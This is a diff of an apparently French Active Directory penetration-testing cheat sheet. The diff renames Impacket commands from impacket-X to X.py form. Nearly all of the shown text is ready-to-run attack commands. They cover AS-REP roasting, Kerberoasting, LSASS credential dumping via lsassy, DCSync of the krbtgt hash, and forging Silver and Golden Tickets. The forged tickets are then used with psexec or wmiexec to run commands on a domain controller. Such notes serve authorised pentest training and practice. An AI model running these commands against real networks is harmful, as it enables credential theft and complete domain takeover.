@@ -59,14 +59,14 @@ Si un compte AD a l'option **"Do not require Kerberos preauthentication"** activ
 nxc ldap 'IP_DC' -u users.txt -p '' --kdcHost 'IP_DC' --asreproast asreproast.txt 
 
 # impacket -  même chose
-impacket-GetNPUsers -dc-ip 'IP_DC' -no-pass -usersfile users.txt corp.com/ -outputfile hashes.asreproast
+GetNPUsers.py -dc-ip 'IP_DC' -no-pass -usersfile users.txt corp.com/ -outputfile hashes.asreproast
 ```
 
 **Avec un compte AD**
 
 ```bash
 # Kali -  énumère les users vulnérables ET récupère les hashes
-impacket-GetNPUsers -dc-ip 'IP_DC' -outputfile hashes.asreproast corp.com/'USER':'PASSWORD'
+GetNPUsers.py -dc-ip 'IP_DC' -outputfile hashes.asreproast corp.com/'USER':'PASSWORD'
 ```
 
 ```powershell
@@ -110,7 +110,7 @@ nxc ldap 'IP_DC' -u 'USER' -p 'PASSWORD' --kdcHost 'IP_DC' --kerberoasting kerbe
 **Depuis Kali -  impacket**
 
 ```bash
-impacket-GetUserSPNs -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD' -outputfile hashes.kerberoast
+GetUserSPNs.py -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD' -outputfile hashes.kerberoast
 ```
 
 **Depuis Windows (Rubeus)**
@@ -212,13 +212,13 @@ nxc smb 192.168.1.10 -u 'USERNAME' -p 'PASSWORD' -M lsassy
 
 Regarder si certains comptes ont des SPN
 ```bash
-impacket-GetUserSPNs -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD'
+GetUserSPNs.py -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD'
 
 nxc ldap 'IP_DC' -u 'USER' -p 'PASSWORD' --kerberoasting output.txt
 ```
 2. Obtenir le Domain SID
 ```bash
-impacket-lookupsid corp.com/'USERNAME':'PASSWORD'@192.168.1.10
+lookupsid.py corp.com/'USERNAME':'PASSWORD'@192.168.1.10
 ```
 
 ```bash
@@ -229,7 +229,7 @@ nxc smb 192.168.1.10 -u 'USERNAME' -p 'PASSWORD' -x "whoami /user"
 
 3. Forger et injecter le Silver Ticket
 ```bash
-impacket-ticketer -nthash 'SERVICE_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain corp.com -spn 'PROTOCOL'/'SPN_HOST'
+ticketer.py -nthash 'SERVICE_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain corp.com -spn 'PROTOCOL'/'SPN_HOST'
 # → génère <USERNAME>.ccache
 ```
 
@@ -237,8 +237,8 @@ impacket-ticketer -nthash 'SERVICE_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain c
 ```bash
 export KRB5CCNAME=<USERNAME>.ccache
 
-impacket-psexec -k -no-pass corp.com/'USERNAME'@'SPN_HOST' -dc-ip 'IP_DC' -target-ip 'IP_DC'
-impacket-wmiexec -k -no-pass corp.com/'USERNAME'@'SPN_HOST' -dc-ip 'IP_DC' -target-ip 'IP_DC'
+psexec.py -k -no-pass corp.com/'USERNAME'@'SPN_HOST' -dc-ip 'IP_DC' -target-ip 'IP_DC'
+wmiexec.py -k -no-pass corp.com/'USERNAME'@'SPN_HOST' -dc-ip 'IP_DC' -target-ip 'IP_DC'
 
 curl -k --negotiate -u : http://<SPN_HOST>
 ```
@@ -314,7 +314,7 @@ Forge un TGT entièrement offline en utilisant le hash NTLM du compte **krbtgt**
 1. Obtenir le hash krbtgt
 ```bash
 # Depuis Kali via DCSync
-impacket-secretsdump -just-dc-user krbtgt corp.com/'DA_USER':'PASSWORD'@'IP_DC'
+secretsdump.py -just-dc-user krbtgt corp.com/'DA_USER':'PASSWORD'@'IP_DC'
 # ou
 nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds
 # → noter le hash NTLM de krbtgt
@@ -324,18 +324,18 @@ nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds
 
 ```bash
 # Obtenir le Domain SID ET le RID du compte cible en une seule commande
-impacket-lookupsid corp.com/'USER':'PASSWORD'@'IP_DC'
+lookupsid.py corp.com/'USER':'PASSWORD'@'IP_DC'
 # S-1-5-21-YYY-YYY-YYY-RID
 # Enlever le RID et on obtient le domain-sid
 
 # Forger le ticket (-user-id obligatoire sur Server 2022+)
-impacket-ticketer -nthash 'KRBTGT_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain corp.com -user-id 'RID' 'USERNAME'
+ticketer.py -nthash 'KRBTGT_NTLM_HASH' -domain-sid 'DOMAIN_SID' -domain corp.com -user-id 'RID' 'USERNAME'
 # → génère <USERNAME>.ccache
 
 # Charger et utiliser
 export KRB5CCNAME=<USERNAME>.ccache
-impacket-psexec -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
-impacket-wmiexec -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
+psexec.py -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
+wmiexec.py -k -no-pass corp.com/'USERNAME'@DC1.corp.com -dc-ip 'IP_DC' -target-ip 'IP_DC'
 ```
 
 **Windows (Mimikatz)**
